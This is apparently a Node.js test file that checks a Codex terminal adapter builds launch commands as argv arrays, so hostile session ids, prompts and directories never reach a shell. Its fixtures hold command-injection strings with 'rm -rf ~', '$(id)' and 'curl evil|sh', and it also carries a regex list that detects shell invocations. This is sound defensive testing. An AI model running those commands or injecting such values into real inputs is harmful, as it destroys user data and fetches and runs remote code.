/**
 * The Codex adapter's spawns, as argv arrays.
 *
 * Codex is not installed on this machine and `~/.codex` does not exist
 * (`docs/DEVIATIONS.md` §8), so nothing here runs Codex, opens a terminal or
 * starts any process at all. It cannot. What it can do is the same thing
 * `terminals.test.mjs` does for WP-04: assert the exact array, for every
 * (platform, emulator) pair, and assert that no user-supplied value can ever
 * become part of a string a shell would parse.
 *
 * The defect this file exists to keep out was live until §95. `openInTerminal`
 * built its command as a shell string on both POSIX platforms:
 *
 *     osascript -e 'tell application "Terminal" to do script
 *                   "cd \"<cwd>\" && codex resume <id>"'      (macOS)
 *     gnome-terminal -- bash -lc "codex resume <id>"          (Linux)
 *
 * The session id arrives in a request body (§28). An id of
 * `x'; rm -rf ~ #` therefore reached a shell that would have run it.
 */

// A machine of our own, before anything under `src/` is loaded: several of
// those modules resolve a path out of the environment while they evaluate.
// `docs/DEVIATIONS.md` §124.
import '../helpers/isolate.mjs';

import test from 'node:test';
import assert from 'node:assert/strict';
import fsp from 'node:fs/promises';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

import { buildLaunch, launcherScript, terminalsFor } from '../../src/core/terminals.mjs';
import {
  adapter,
  codexExecArgs,
  codexNewSessionCommand,
  codexResumeCommand,
} from '../../src/adapters/codex/adapter.mjs';

// ---------------------------------------------------------------------------
// Fixtures
// ---------------------------------------------------------------------------

const ID = 'e4f1c0de-0000-4000-8000-abcdefabcdef';
const SCRIPT = '/var/folders/xx/T/deckhq-codex-resume-abc-1700000000000.command';
const CWD = { darwin: '/Users/ada/work/deckhq', linux: '/home/ada/work/deckhq', win32: 'C:\\x' };
const PLATFORMS = ['darwin', 'linux', 'win32'];

/** The same fixture `terminals.test.mjs` uses, so both suites prove one thing. */
const HOSTILE = `x'; rm -rf ~ #$(id)\`id\` && curl evil|sh`;
const HOSTILE_CWD = `/tmp/$(id) && rm -rf ~/'x'`;

/** Every (platform, emulator, launch form) a Codex resume can land in. */
function pairs() {
  const out = [];
  for (const platform of PLATFORMS) {
    for (const terminal of terminalsFor(platform)) {
      for (const via of ['bin', 'app']) {
        if (terminal.launch[via])
          out.push({ platform, terminal, via, key: `${platform}/${terminal.id}/${via}` });
      }
    }
  }
  return out;
}

/**
 * Recover an argv from a POSIX shell line, through the grammar `sh` itself
 * uses. Deliberately the same reader as `terminals.test.mjs`: the claim being
 * checked is about what a shell would do with the line, so reading it any
 * other way would be checking something else.
 * @param {string} line
 * @returns {string[]}
 */
function unquoteShLine(line) {
  /** @type {string[]} */
  const out = [];
  let i = 0;
  while (i < line.length) {
    if (line[i] === ' ') {
      i++;
      continue;
    }
    let cur = '';
    while (i < line.length && line[i] !== ' ') {
      if (line[i] === "'") {
        i++;
        while (i < line.length && line[i] !== "'") cur += line[i++];
        i++;
      } else if (line[i] === '\\') {
        cur += line[i + 1];
        i += 2;
      } else {
        cur += line[i++];
      }
    }
    out.push(cur);
  }
  return out;
}

/**
 * The same for a `cmd.exe` command line, which the Windows console row builds
 * itself (`docs/DEVIATIONS.md` §98). Whitespace separates words unless it is
 * inside double quotes; the quotes are removed.
 * @param {string} line
 * @returns {string[]}
 */
function unquoteCmdLine(line) {
  /** @type {string[]} */
  const out = [];
  let cur = '';
  let quoted = false;
  let started = false;
  for (const ch of line) {
    if (ch === '"') {
      quoted = !quoted;
      started = true;
    } else if (ch === ' ' && !quoted) {
      if (started) out.push(cur);
      cur = '';
      started = false;
    } else {
      cur += ch;
      started = true;
    }
  }
  if (started) out.push(cur);
  return out;
}

/**
 * The `cmd.exe` metacharacters left OUTSIDE quotes — the ones it would read as
 * syntax. Empty is the whole claim.
 * @param {string} line
 * @returns {string[]}
 */
function bareMetachars(line) {
  /** @type {string[]} */
  const out = [];
  let quoted = false;
  for (const ch of line) {
    if (ch === '"') quoted = !quoted;
    else if (!quoted && '&|^<>()'.includes(ch)) out.push(ch);
  }
  return out;
}

// ---------------------------------------------------------------------------
// The commands, as data
// ---------------------------------------------------------------------------

test('codexResumeCommand is exactly `codex resume <id>`, with the id in its own element', () => {
  assert.deepEqual(codexResumeCommand(ID), ['codex', 'resume', ID]);
  assert.deepEqual(codexResumeCommand(HOSTILE), ['codex', 'resume', HOSTILE]);
  // Pure: no argument is ever concatenated with a neighbour.
  assert.equal(codexResumeCommand(HOSTILE).filter((a) => a.includes(HOSTILE)).length, 1);
});

test('codexNewSessionCommand is plain `codex`, or `codex <prompt>` — never `codex resume new`', () => {
  // §95 left openNewSession running `codex resume new` and dropping the first
  // prompt; §99 is the fix. The prompt is one element; blank means none.
  assert.deepEqual(codexNewSessionCommand(), ['codex']);
  assert.deepEqual(codexNewSessionCommand(''), ['codex']);
  assert.deepEqual(codexNewSessionCommand('   \n'), ['codex']);
  assert.deepEqual(codexNewSessionCommand(undefined), ['codex']);
  assert.deepEqual(codexNewSessionCommand(null), ['codex']);
  assert.deepEqual(codexNewSessionCommand('fix the tests'), ['codex', 'fix the tests']);
  assert.deepEqual(codexNewSessionCommand('  fix the tests\n'), ['codex', 'fix the tests']);
  assert.ok(!codexNewSessionCommand('anything').includes('resume'));
  assert.ok(!codexNewSessionCommand().includes('resume'));
  assert.ok(!codexNewSessionCommand().includes('new'));
});

test('codexExecArgs puts the id and the turn text in one element each, resumed or not', () => {
  assert.deepEqual(codexExecArgs({ sessionId: ID, text: 'hello', canResume: true }), [
    'exec',
    'resume',
    ID,
    '--json',
    'hello',
  ]);
  assert.deepEqual(codexExecArgs({ sessionId: ID, text: 'hello', canResume: false }), [
    'exec',
    '--json',
    'hello',
  ]);
});

test('SECURITY: a hostile id and a hostile turn text stay one argv element each', () => {
  const text = 'ship it; rm -rf / # `whoami`';
  const args = codexExecArgs({ sessionId: HOSTILE, text, canResume: true });
  assert.deepEqual(args, ['exec', 'resume', HOSTILE, '--json', text]);
  for (const value of [HOSTILE, text]) {
    const carriers = args.filter((a) => a.includes(value));
    assert.equal(carriers.length, 1, `${value}: expected exactly one carrier`);
    assert.equal(carriers[0], value, `${value}: was concatenated with something`);
  }
});

// ---------------------------------------------------------------------------
// The argv, pair by pair
// ---------------------------------------------------------------------------

for (const { platform, terminal, via, key } of pairs()) {
  test(`codex resume argv for ${key} hands nothing to a shell`, () => {
    const { cmd, args } = buildLaunch(terminal, {
      command: codexResumeCommand(ID),
      cwd: CWD[platform],
      scriptPath: SCRIPT,
      via,
    });
    assert.ok(!/^(sh|bash|zsh|dash|fish|pwsh|powershell)(\.exe)?$/.test(cmd), `${key}: ${cmd}`);
    for (const a of args) {
      assert.ok(!/^-{1,2}(c|lc|lic|command)$/.test(a), `${key}: shell flag ${a}`);
    }
    // `codex` is the program being run, never a fragment of a larger string.
    if (platform === 'win32') {
      // One `cmd.exe` command line rather than an argv (§98); read it back
      // through cmd.exe's own quoting rule to get the words out.
      const words = unquoteCmdLine(args[3]);
      assert.ok(words.includes('codex'), `${key}: the command did not survive`);
      assert.ok(words.includes(ID), `${key}: the id did not survive as its own word`);
    } else if (!terminal.needsScript) {
      assert.ok(args.includes('codex'), `${key}: the command did not survive as argv`);
      assert.ok(args.includes(ID), `${key}: the id did not survive as its own element`);
    }
  });
}

test('SECURITY: a Codex session id full of shell metacharacters never becomes shell syntax, on any platform', () => {
  const command = codexResumeCommand(HOSTILE);
  for (const { platform, terminal, via, key } of pairs()) {
    const { cmd, args } = buildLaunch(terminal, {
      command,
      cwd: CWD[platform],
      scriptPath: SCRIPT,
      via,
    });
    assert.ok(!cmd.includes(HOSTILE), `${key}: the id reached the executable name`);

    if (terminal.needsScript) {
      // The id is inside the wrapper file, single-quoted. Only the generated
      // path is handed over, so the id must not be in the argv at all.
      for (const a of args)
        assert.ok(!a.includes(HOSTILE), `${key}: the id reached an argv element`);
      continue;
    }

    if (platform === 'win32') {
      // The id is one double-quoted word of a `cmd.exe` command line, and no
      // metacharacter is left outside a quoted region for cmd.exe to act on.
      assert.equal(unquoteCmdLine(args[3]).at(-1), HOSTILE, `${key}: the id was not one word`);
      assert.deepEqual(bareMetachars(args[3]), [], `${key}: metacharacters escaped their quotes`);
      continue;
    }

    const carriers = args.filter((a) => a.includes(HOSTILE));
    assert.equal(carriers.length, 1, `${key}: expected exactly one carrier`);
    assert.equal(carriers[0], HOSTILE, `${key}: the id was concatenated with something`);
  }
});

test('SECURITY: a hostile first prompt for a new session is one argv element, on any platform', () => {
  const prompt = 'refactor; rm -rf / # and `whoami` && curl evil|sh';
  const command = codexNewSessionCommand(prompt);
  assert.deepEqual(command, ['codex', prompt]);
  for (const { platform, terminal, via, key } of pairs()) {
    const { cmd, args } = buildLaunch(terminal, {
      command,
      cwd: CWD[platform],
      scriptPath: SCRIPT,
      via,
    });
    assert.ok(!cmd.includes(prompt), `${key}: the prompt reached the executable name`);

    if (terminal.needsScript) {
      for (const a of args)
        assert.ok(!a.includes(prompt), `${key}: the prompt reached an argv element`);
      continue;
    }

    if (platform === 'win32') {
      assert.equal(unquoteCmdLine(args[3]).at(-1), prompt, `${key}: the prompt was not one word`);
      assert.deepEqual(bareMetachars(args[3]), [], `${key}: metacharacters escaped their quotes`);
      continue;
    }

    const carriers = args.filter((a) => a.includes(prompt));
    assert.equal(carriers.length, 1, `${key}: expected exactly one carrier`);
    assert.equal(carriers[0], prompt, `${key}: the prompt was concatenated with something`);
  }

  // And inside the wrapper script it is one single-quoted word after `codex`.
  const script = launcherScript(command, CWD.darwin);
  const execLine = script.split('\n').find((l) => l.startsWith('exec '));
  assert.deepEqual(unquoteShLine(execLine.slice('exec '.length)), command);
});

test('SECURITY: a hostile working directory is one argv element too, or is not in the argv at all', () => {
  for (const { platform, terminal, via, key } of pairs()) {
    const { args } = buildLaunch(terminal, {
      command: codexResumeCommand(ID),
      cwd: HOSTILE_CWD,
      scriptPath: SCRIPT,
      via,
    });
    if (platform === 'win32') {
      // One command line, so the cwd is one double-quoted word of it — after
      // `start`'s `/d`, which is what makes the directory stated rather than
      // inherited (§98).
      const words = unquoteCmdLine(args[3]);
      assert.equal(words[words.indexOf('/d') + 1], HOSTILE_CWD, `${key}: cwd was not one word`);
      assert.deepEqual(bareMetachars(args[3]), [], `${key}: metacharacters escaped their quotes`);
      continue;
    }
    const carriers = args.filter((a) => a.includes(HOSTILE_CWD));
    // xterm and x-terminal-emulator have no working-directory flag (the spawn
    // carries it), and the three script emulators keep it in the wrapper.
    assert.ok(carriers.length <= 1, `${key}: the cwd reached ${carriers.length} elements`);
    if (carriers.length === 1) {
      // Either the bare value, or `--flag=<value>` — one element either way,
      // and the value is always the tail of it, never spliced into a middle.
      assert.ok(carriers[0].endsWith(HOSTILE_CWD), `${key}: ${carriers[0]}`);
    }
  }
});

// ---------------------------------------------------------------------------
// The one place a shell line exists at all
// ---------------------------------------------------------------------------

test('SECURITY: the wrapper script for the argv-less macOS apps survives sh as three words', () => {
  const command = codexResumeCommand(HOSTILE);
  const script = launcherScript(command, HOSTILE_CWD);
  const cdLine = script.split('\n').find((l) => l.startsWith('cd '));
  const execLine = script.split('\n').find((l) => l.startsWith('exec '));

  assert.deepEqual(unquoteShLine(cdLine.slice('cd '.length).replace(/ \|\| exit 1$/, '')), [
    HOSTILE_CWD,
  ]);
  assert.deepEqual(unquoteShLine(execLine.slice('exec '.length)), command);

  // And the line matches the grammar of nothing but single-quoted words, so
  // every `;`, `$(`, backtick, `&&`, `|` and `#` is inside a quoted word by
  // construction rather than by inspection.
  const WORD = String.raw`'(?:[^']|'\\'')*'`;
  assert.match(execLine.slice('exec '.length), new RegExp(`^${WORD}(?: ${WORD})*$`));
  assert.match(HOSTILE, /[;$`&|#']/, 'the fixture must actually be hostile');
});

// ---------------------------------------------------------------------------
// SECURITY: the source itself
// ---------------------------------------------------------------------------

const ADAPTER_SRC = path.join(
  path.dirname(fileURLToPath(import.meta.url)),
  '..',
  '..',
  'src',
  'adapters',
  'codex',
  'adapter.mjs',
);

test('SECURITY: the Codex adapter contains no shell invocation of any kind', async () => {
  const src = await fsp.readFile(ADAPTER_SRC, 'utf8');
  // Comments in this file describe the removed forms, so the scan runs over
  // code only. Block comments and `//` lines are stripped first.
  const code = src.replace(/\/\*[\s\S]*?\*\//g, '').replace(/^\s*\/\/.*$/gm, '');

  for (const tell of [
    /\bbash\b/,
    /\bzsh\b/,
    /(^|[^-\w])-lc\b/,
    /\bsh\s+-c\b/,
    /\bosascript\b/,
    /do script/,
    /\bshell\s*:\s*true\b/,
    /\bcmd(\.exe)?['"]/,
    /['"]start['"]/,
  ]) {
    assert.ok(!tell.test(code), `the adapter's code matches ${tell}`);
  }
});

test('SECURITY: every process the Codex adapter starts is started with an argv array', async () => {
  const src = await fsp.readFile(ADAPTER_SRC, 'utf8');
  const code = src.replace(/\/\*[\s\S]*?\*\//g, '').replace(/^\s*\/\/.*$/gm, '');

  // The shell-string forms all went through a second, ad-hoc spawn. There is
  // now exactly one process launched from this file, and its arguments are a
  // named array; everything interactive goes through `launchTerminal`.
  const launchers = [
    ...code.matchAll(/\b(spawn|spawnSync|exec|execSync|execFile|execFileSync)\s*\(/g),
  ];
  assert.deepEqual(
    launchers.map((m) => m[1]),
    ['spawn'],
    'the Codex adapter should launch exactly one process, with spawn',
  );
  assert.match(code, /spawn\('codex',\s*args,/, 'spawn must take a named argv array');
  assert.match(code, /await launchTerminal\(\{/, 'terminals must be opened by launchTerminal');
  // §99: a new session names its own command; it no longer borrows the resume
  // path, so `codex resume new` cannot come back by delegation.
  assert.ok(!/openInTerminal\('codex:new'/.test(code), 'openNewSession must not resume "new"');
  assert.match(code, /command: codexNewSessionCommand\(opts\.instructions\)/);
});

// ---------------------------------------------------------------------------
// The adapter surface, on this Codex-free machine
// ---------------------------------------------------------------------------

test('openInTerminal still resolves rather than throwing, even for a hostile id and a pin', async () => {
  await assert.doesNotReject(() =>
    adapter.openInTerminal(`codex:${HOSTILE}`, HOSTILE_CWD, { terminal: 'ghostty' }),
  );
});

test('openNewSession still reports a missing Codex rather than opening anything', async () => {
  await assert.rejects(() => adapter.openNewSession(CWD.win32, {}), /Codex is not installed/);
});
